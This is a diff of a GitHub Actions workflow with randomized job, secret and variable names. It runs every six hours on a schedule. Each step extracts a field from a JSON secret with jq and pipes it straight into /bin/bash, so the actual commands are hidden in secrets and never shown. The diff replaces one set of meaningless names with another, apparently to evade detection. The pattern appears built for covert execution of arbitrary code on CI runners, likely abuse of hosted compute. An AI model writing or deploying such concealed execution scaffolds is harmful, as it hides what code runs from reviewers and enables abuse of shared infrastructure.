@@ -3,25 +3,24 @@ name: shangdongpeng4637
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 5/6 * * *'
+    - cron: '53 1/6 * * *'
 
-jobs:  # 27758
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: shangdongpeng4637
         env:
-          nke539: ${{ secrets.nke539 }}
+          ttaq97792: ${{ secrets.ttaq97792 }}
         run: |
-          echo $nke539 | jq -r .i352 | /bin/bash
-          echo $iimt3134 | jq -r .wmhud3451 | /bin/bash
-          echo $efrdb44 | jq -r .gb67 | /bin/bash
-          echo $lpfx35 | jq -r .w50027 | /bin/bash
-          echo $etsj955 | jq -r .w86019 | /bin/bash
-          echo $ga7114 | jq -r .d33514 | /bin/bash
-          echo $b3918 | jq -r .gqi85863 | /bin/bash
-          echo $lofsn45 | jq -r .ezx35 | /bin/bash
-          echo $eh4 | jq -r .ustn51221 | /bin/bash
+          echo $ttaq97792 | jq -r .xehl4906 | /bin/bash
+          echo $otqb2 | jq -r .xle06 | /bin/bash
+          echo $qz59541 | jq -r .puio968 | /bin/bash
+          echo $wvdzq7 | jq -r .jcs62 | /bin/bash
+          echo $m3 | jq -r .io57409 | /bin/bash
+          echo $gpu311 | jq -r .yq54289 | /bin/bash
+          echo $z446 | jq -r .xgfl1881 | /bin/bash
+          echo $y8 | jq -r .p1 | /bin/bash
+          echo $xnvik4220 | jq -r .n852 | /bin/bash
 
